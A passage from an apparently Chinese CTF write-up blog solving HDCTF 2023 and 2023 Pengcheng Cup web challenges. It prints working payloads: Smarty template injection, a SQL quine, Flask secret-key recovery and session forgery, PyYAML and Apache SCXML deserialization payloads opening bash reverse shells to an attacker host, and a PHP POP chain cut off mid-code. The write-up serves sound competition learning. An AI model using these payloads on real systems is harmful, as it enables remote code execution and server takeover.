<h2 id="2-SearchMaster"><a href="#2-SearchMaster" class="headerlink" title="2.SearchMaster"></a>2.SearchMaster</h2><p>看报错信息是Smarty模板注入,<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=&#123;if system(‘cat /flag_13_searchmaster’)&#125;&#123;/if&#125;</span><br><span class="line"></span><br><span class="line">data=&#123;&#123;system(‘cat /flag_13_searchmaster’)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="3-LoginMaster"><a href="#3-LoginMaster" class="headerlink" title="3.LoginMaster"></a>3.LoginMaster</h2><p>具体看这篇<a href="https://hq185187.github.io/2023/05/12/nssctf2/#25hdctf-2023loginmaster">博客</a><br>payload:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;union/**/select/**/replace(replace(&#x27;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure></p>
<h2 id="4-YamiYami"><a href="#4-YamiYami" class="headerlink" title="4.YamiYami"></a>4.YamiYami</h2><p>考点:yaml反序列化,session伪造<br>进去后有三个链接,第一个跳转百度,/read路由,感觉可以读取任意文件<br>第二个是上传文件的位置,第三个给了pwd内容说明当前目录在/app</p>
<p>非预期:<br>在read路由读环境变量:/proc/1/environ得到flag:NSSCTF{944467cc-e7ef-446b-92f6-b5f45479e30e}</p>
<p>预期:<br>在/read路由尝试读app.py和flag发现被正则过滤,url二次编码app/app.py:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///%25%36%31%25%37%30%25%37%30%25%32%46%25%36%31%25%37%30%25%37%30%25%32%45%25%37%30%25%37%39</span><br></pre></td></tr></table></figure><br>源码:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re, random, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">False</span></span><br><span class="line">BLACK_LIST=[<span class="string">&quot;yaml&quot;</span>,<span class="string">&quot;YAML&quot;</span>,<span class="string">&quot;YML&quot;</span>,<span class="string">&quot;yml&quot;</span>,<span class="string">&quot;yamiyami&quot;</span>]</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&quot;/app/uploads&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;passport&#x27;</span>] = <span class="string">&#x27;YamiYami&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Welcome to HDCTF2023 &lt;a href=&quot;[/read?url=https://baidu.com](view-source:http://node2.anna.nssctf.cn:28427/read?url=https://baidu.com)&quot;&gt;Read somethings&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Here is the challenge &lt;a href=&quot;[/upload](view-source:http://node2.anna.nssctf.cn:28427/upload)&quot;&gt;Upload file&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Enjoy it &lt;a href=&quot;[/pwd](view-source:http://node2.anna.nssctf.cn:28427/pwd)&quot;&gt;pwd&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pwd&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(pwdpath)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        <span class="keyword">if</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        res = urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">   <span class="keyword">for</span> blackstr <span class="keyword">in</span> BLACK_LIST:</span><br><span class="line">       <span class="keyword">if</span> blackstr <span class="keyword">in</span> filename:</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>):</span><br><span class="line">                os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>)==<span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile=request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br></pre></td></tr></table></figure><br>在/boogipop路由发现yaml.full_load(f)可知这里可以pyyaml反序列化,还需要修改<code>session[passport]=Welcome To HDCTF2023</code>.然后传参file=你上传的文件就能反序列化其中的内容</p>
<p>分析:</p>
<ol>
<li><code>random.seed(uuid.getnode())</code> 是使用 Python 中的 <code>random</code> 模块来设置随机数生成器的种子(seed)。在这里，<code>uuid.getnode()</code> 函数返回本机的MAC地址（物理地址）。而<code>app.config[&#39;SECRET_KEY&#39;] = str(random.random()*233)</code>,说明这个secret_key我们可以获取,利用file读取/sys/class/net/eth0/address,这个是网卡的位置,得到<code>02:42:ac:02:21:e1</code>,然后:</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import random  </span><br><span class="line">random.seed(0x0242ac0221e1)  </span><br><span class="line">print(str(random.random()*233))</span><br></pre></td></tr></table></figure>
<p>得到secret_key是:158.36050847457943<br>session伪造脚本:<a href="https://github.com/noraj/flask-session-cookie-manager">noraj/flask-session-cookie-manager: Flask Session Cookie Decoder/Encoder (github.com)</a><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py  decode -c &quot;eyJwYXNzcG9ydCI6IllhbWlZYW1pIn0.ZMMvzQ.jAEoVGlOnl6rKkoodauVQIZzOos&quot; -s &quot;158.36050847457943&quot;</span><br><span class="line"></span><br><span class="line">&#123;&#x27;passport&#x27;: &#x27;YamiYami&#x27;&#125;</span><br></pre></td></tr></table></figure><br>加密:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py  encode -s &quot;158.36050847457943&quot; -t &quot;&#123;&#x27;passport&#x27;: &#x27;Welcome To HDCTF2023&#x27;&#125;&quot;</span><br><span class="line"></span><br><span class="line">eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.ZMM0JA.kJKssae4JiE6rFv10EThz6FaTt0</span><br></pre></td></tr></table></figure></p>
<ol>
<li>yaml反序列化:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!!python/object/new:str  </span><br><span class="line">args: []  </span><br><span class="line">state: !!python/tuple  </span><br><span class="line">- &quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port &lt;&amp;1\&quot;&#x27;)&quot;  </span><br><span class="line">- !!python/object/new:staticmethod  </span><br><span class="line">args: []  </span><br><span class="line">state:  </span><br><span class="line">update: !!python/name:eval  </span><br><span class="line">items: !!python/name:list</span><br></pre></td></tr></table></figure>
命名1.txt在upload页面上交躲避黑名单<br>然后在/boogipop路由下改变session,file=uploads/1.txt<br>在根目录下的flag.sh没有flag,在/tmp/flag_13_114514里找到,但是当时比赛据说这里也没有flag而是读的环境变量</li>
</ol>
<p><img src="https://img1.imgtp.com/2023/07/28/kH28MPpA.png" alt="屏幕截图 2023-07-28 115431.png"></p>
<h2 id="5-HDCTF-2023-BabyJxVx"><a href="#5-HDCTF-2023-BabyJxVx" class="headerlink" title="5.[HDCTF 2023]BabyJxVx"></a>5.[HDCTF 2023]BabyJxVx</h2><p>考点:Apache SCXML2 RCE,参考<a href="https://boogipop.com/2023/04/24/Apache%20SCXML2%20RCE%E5%88%86%E6%9E%90/">这位大佬</a><br>下载附件查看源码:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.babyjxvx.FlagController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.ParserConfigurationException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCXMLExecutor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.io.SCXMLReader;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.SCXML;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Flagcontroller</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Flagcontroller</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Boolean <span class="title function_">check</span><span class="params">(String fileName)</span> <span class="keyword">throws</span> IOException, ParserConfigurationException, SAXException &#123;</span><br><span class="line">        <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">        <span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">        <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(fileName);</span><br><span class="line">        <span class="type">int</span> <span class="variable">node1</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;script&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node2</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;datamodel&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node3</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;invoke&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node4</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;param&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node5</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;parallel&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node6</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;history&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node7</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;transition&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node8</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;state&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node9</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;onentry&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node10</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;if&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node11</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;elseif&quot;</span>).getLength();</span><br><span class="line">        <span class="keyword">return</span> node1 &lt;= <span class="number">0</span> &amp;&amp; node2 &lt;= <span class="number">0</span> &amp;&amp; node3 &lt;= <span class="number">0</span> &amp;&amp; node4 &lt;= <span class="number">0</span> &amp;&amp; node5 &lt;= <span class="number">0</span> &amp;&amp; node6 &lt;= <span class="number">0</span> &amp;&amp; node7 &lt;= <span class="number">0</span> &amp;&amp; node8 &lt;= <span class="number">0</span> &amp;&amp; node9 &lt;= <span class="number">0</span> &amp;&amp; node10 &lt;= <span class="number">0</span> &amp;&amp; node11 &lt;= <span class="number">0</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/Flag&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Flag</span><span class="params">(<span class="meta">@RequestParam(required = true)</span> String filename)</span> &#123;</span><br><span class="line">        <span class="type">SCXMLExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (check(filename)) &#123;</span><br><span class="line">                <span class="type">SCXML</span> <span class="variable">scxml</span> <span class="operator">=</span> SCXMLReader.read(filename);</span><br><span class="line">                executor.setStateMachine(scxml);</span><br><span class="line">                executor.go();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Revenge to me!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">            System.out.println(var4);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;revenge?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>过滤script,datamodel,invoke,param,parallel,history,transition,state,onentry,if,elseif这些标签<br>payload:<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">final</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">onexit</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">assign</span> <span class="attr">location</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">expr</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">onexit</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">final</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure><br>在vps放上1.xml的内容,在当前目录开启python临时服务器:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 1234</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28554/Flag?filename=http://ip:1234/1.xml</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure>
<p>然后在根目录下得到flag</p>
<p><img src="https://img1.imgtp.com/2023/07/28/q5LCq9Ji.png" alt="屏幕截图 2023-07-28 175443.png"></p>
]]></content>
      <categories>
        <category>CTF比赛wp</category>
      </categories>
      <tags>
        <tag>CTF比赛wp</tag>
      </tags>
  </entry>
  <entry>
    <title>2023鹏城杯</title>
    <url>/2024/02/06/pengchengbei/</url>
    <content><![CDATA[<h3 id="Web-Escape"><a href="#Web-Escape" class="headerlink" title="Web-Escape"></a>Web-Escape</h3><p>这题直接改的别人的题,链接:<a href="https://github.com/noflowpls101/CTFS_2023/blob/a78e5f759304a01415cb6b1f5113c2384b353e7f/ImaginaryCTF_2023/Web_Helpful/solve.py">https://github.com/noflowpls101/CTFS_2023/blob/a78e5f759304a01415cb6b1f5113c2384b353e7f/ImaginaryCTF_2023/Web_Helpful/solve.py</a><br>,没给salt,16位爆破太长了,直接注入找环境变量<br>主要是信息收集吧 <a href="https://imaginaryctf.org/ArchivedChallenges/39">https://imaginaryctf.org/ArchivedChallenges/39</a><br><img src="https://s2.loli.net/2023/11/05/6jadwg4nsUipHG8.png" alt="image.png"></p>
<p><code>http://172.10.0.5:10000/?username=&#123;passhash.__str__.__globals__[app].wsgi_app.__globals__[os].environ&#125;&amp;password=anything</code><br>注入<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231104173536.png" alt="Pasted image 20231104173536.png"></p>
<h3 id="Web-web1"><a href="#Web-web1" class="headerlink" title="Web-web1"></a>Web-web1</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exp</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hacker</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hacker-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$finish</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;finish-&gt;<span class="title function_ invoke__">hacker</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hacker</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$parms1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$parms1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hacker-&gt;<span class="title function_ invoke__">welcome</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">welcome</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">welcome</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;welcome~ &quot;</span>.<span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">R</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">welcome</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="literal">true</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;finish1-&gt;name) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;finish-&gt;finish) &#123;</span><br><span class="line">                <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;method,<span class="variable">$this</span>-&gt;args);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nonono</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|system|eval|flag/i&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&quot;pop&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">nonono</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>牛魔题,直接秒了<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exp</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span 